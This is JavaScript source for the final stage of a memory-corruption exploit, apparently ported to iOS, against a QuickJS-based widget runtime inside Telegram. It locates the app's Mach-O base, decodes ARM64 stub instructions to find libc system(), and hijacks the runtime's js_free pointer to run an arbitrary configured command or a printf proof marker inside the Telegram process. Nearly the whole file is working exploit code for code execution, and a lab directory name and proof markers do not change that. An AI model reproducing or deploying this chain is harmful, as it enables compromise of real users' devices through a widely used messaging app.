  /* ======================= iOS endgame (v1) ==============================
   *
   * Replaces the Android ELF/system() tail of
   * telegramandroidwidget/lab/regexp1827_class64/device_payload_v7_universal.js
   *
   * Inputs (already defined by the primitive):
   *   rt      JSRuntime* of the running widget runtime
   *   js_free rt->mf.js_free (js_def_free, a stub in TelegramUIFramework)
   *   D       address of the victim Uint8Array data block (user data)
   *   ENT     victim object ({u8: Uint8Array view over D, ...})
   *   TRIG    Uint8Array(4096) large block that frees synchronously
   *   BIG     Uint8Array(4096) second large block
   *   rd64/wr64, codeok, hex, setres
   *
   * New CFG fields (filled by make_ios_payload.py from the IPA):
   *   JS_DEF_FREE   offset of js_def_free in the Mach-O image (0 = scan)
   *   STUB_PRINTF   offset of the app's `printf` stub        (0 = no proof)
   *   STUB_FFLUSH   offset of the app's `fflush` stub        (0 = no flush)
   *   SYSTEM_ADDR   absolute libc system() address, optional
   *   MARKER        fixed ASCII marker (no '%' unless escaped)
   *
   * The proof is a single `printf(marker)` executed inside the Telegram
   * process through rt->mf.js_free.  Return value is ignored by js_free_rt,
   * so the runtime continues.  Launch Telegram with
   * `developer dvt launch --stream` to capture stdout.
   * ====================================================================== */

  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var opaque0 = rd64(rt + 64n);

  /* ---- 1. image base: js_free - js_def_free_offset ---------------------- */
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n && CFG.JS_DEF_MALLOC) {
    /* Some builds initialize mf.js_free to libc free; js_malloc is still the
       quickjs js_def_malloc stub. */
    var jm = rd64(rt + 8n);
    if (codeok(jm)) {
      base = u64(jm - BigInt(CFG.JS_DEF_MALLOC));
      if ((rd32(base) >>> 0) !== 0xfeedfacf) base = 0n;
    }
  }
  if (base === 0n) {
    /* Fallback: 16 KiB steps (the iOS arm64 page/mapping alignment), then a
       4 KiB refine.  The 109 MB UI framework needs at most ~7k reads. */
    var p0 = u64(js_free) & ~0x3fffn;
    for (var si = 0; si < 0x2000; si++) {
      var a = p0 - BigInt(si) * 0x4000n;
      if (a < 0x10000n) break;
      if ((rd32(a) >>> 0) === 0xfeedfacf) { base = a; break; }
    }
    if (base === 0n) {
      var p1 = u64(js_free) & ~0xfffn;
      for (var sj = 0; sj < 0x1000; sj++) {
        var a2 = p1 - BigInt(sj) * 0x1000n;
        if (a2 < 0x10000n) break;
        if ((rd32(a2) >>> 0) === 0xfeedfacf) { base = a2; break; }
      }
    }
  }
  if (base === 0n) { setres('IOS_NO_BASE'); return; }
  if (CFG.DBG) setres('DBG base=' + hex(base) + ' jsfree=' + hex(js_free));

  /* ---- 2a. optional system(cmd): SYSTEM_ADDR or SYSTEM_DELTA ----------- */
  var systemAddr = 0n;
  if (CFG.SYSTEM_ADDR) {
    systemAddr = BigInt(CFG.SYSTEM_ADDR);
  } else if (CFG.SYSTEM_DELTA) {
    /* js_free is the app's js_def_free stub: MOV X0,X1 ; B free@plt.
       Decode the branch target, then the PLT stub's ADRP/LDR to the GOT,
       exactly like the Android tail.  On iOS all dyld-cache images share
       the same ASLR slide, so system = free + constant delta. */
    var libcFree = 0n;
    if (rd32(js_free) === 0xaa0103e0) {
      var br = rd32(js_free + 4n);
      if (((br & 0xfc000000) >>> 0) === 0x14000000) {
        var im = br & 0x03ffffff;
        if (im & 0x02000000) im -= 0x04000000;
        var plt = js_free + 4n + BigInt(im) * 4n;
        var ad = rd32(plt);
        if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
          var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
          var ai = (mh << 2) | ml;
          if (ai & 0x100000) ai -= 0x200000;
          var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
          var ld = rd32(plt + 4n);
          if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
            var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
            if (codeok(g2)) libcFree = g2;
          }
        }
      }
    }
    if (libcFree === 0n) { setres('IOS_NO_LIBCFREE'); return; }
    systemAddr = u64(libcFree + BigInt(CFG.SYSTEM_DELTA));
    if (!codeok(systemAddr)) { setres('IOS_BAD_SYSTEM'); return; }
    if (CFG.DBG) setres('DBG libcfree=' + hex(libcFree) +
                        ' system=' + hex(systemAddr));
  }
  if (systemAddr !== 0n) {
    var cmd = CFG.CMD, n = cmd.length;
    for (var ci = 0; ci < n; ci++) ENT.u8[ci] = cmd.charCodeAt(ci) & 0xff;
    ENT.u8[n] = 0;
    setres('IOS_HOOK_SYSTEM ' + hex(systemAddr));
    wr64(rt + 16n, systemAddr);
    wr64(rt + 64n, D);
    try { TRIG = null; } catch (e) { setres('IOS_EXC_SYS'); return; }
    wr64(rt + 16n, js_free);
    wr64(rt + 64n, opaque0);
    setres('IOS_AFTER_SYSTEM');
    return;
  }

  /* ---- 2b. printf/puts(marker) proof ---------------------------------- */
  var proofAddr = 0n, proofName = '';
  if (CFG.PROOF_ADDR) {
    proofAddr = BigInt(CFG.PROOF_ADDR);
    proofName = 'ABS';
  } else if (CFG.STUB_PRINTF) {
    proofAddr = base + BigInt(CFG.STUB_PRINTF);
    proofName = 'PRINTF';
  } else if (CFG.STUB_PUTS) {
    proofAddr = base + BigInt(CFG.STUB_PUTS);
    proofName = 'PUTS';
  } else {
    setres('IOS_NO_PRINTF_STUB');
    return;
  }
  /* A wrong stub offset must not become a wild branch: __stubs entries start
     with `adrp x16, …` (0x9xxxxxxx) or a direct `b` (0x14xxxxxx). */
  function isStubAddr(p) {
    var w = rd32(p) >>> 0;
    return ((w & 0x9f000000) >>> 0) === 0x90000000 ||
           ((w & 0xfc000000) >>> 0) === 0x14000000;
  }
  if (!CFG.PROOF_ADDR && !isStubAddr(proofAddr)) {
    setres('IOS_BAD_PROOF_STUB ' + hex(proofAddr));
    return;
  }
  var marker = CFG.MARKER || 'IOSPORT_R1827_OK\n';
  var mn = marker.length;
  for (var mi = 0; mi < mn; mi++) ENT.u8[mi] = marker.charCodeAt(mi) & 0xff;
  ENT.u8[mn] = 0;

  setres('IOS_HOOK_' + proofName + ' base=' + hex(base));
  wr64(rt + 16n, proofAddr);        /* rt->mf.js_free = printf/puts */
  wr64(rt + 64n, D);                /* opaque = marker string */
  try { TRIG = null; } catch (e) { setres('IOS_EXC_PRINTF'); return; }
  wr64(rt + 16n, js_free);          /* restore before anything else */
  wr64(rt + 64n, opaque0);

  /* ---- 3. fflush(NULL): flush the stdio buffer ------------------------ */
  if (CFG.FFLUSH_ADDR || CFG.STUB_FFLUSH) {
    var fflushAddr = CFG.FFLUSH_ADDR ? BigInt(CFG.FFLUSH_ADDR)
                                     : base + BigInt(CFG.STUB_FFLUSH);
    if (!CFG.FFLUSH_ADDR && !isStubAddr(fflushAddr)) {
      setres('IOS_BAD_FFLUSH_STUB ' + hex(fflushAddr));
    } else {
      var FL = null;
      try { FL = new Uint8Array(4096); } catch (e) { FL = null; }
      if (FL) {
        wr64(rt + 16n, fflushAddr);
        wr64(rt + 64n, 0n);
        try { FL = null; } catch (e) {}
        wr64(rt + 16n, js_free);
        wr64(rt + 64n, opaque0);
      }
    }
  }

  setres('IOS_OK base=' + hex(base) + ' proof=' + hex(proofAddr));
  try {
    if (typeof document !== 'undefined' && document && document.body) {
      document.body.setAttribute('data-iosport', 'IOS_OK');
    }
  } catch (e) {}
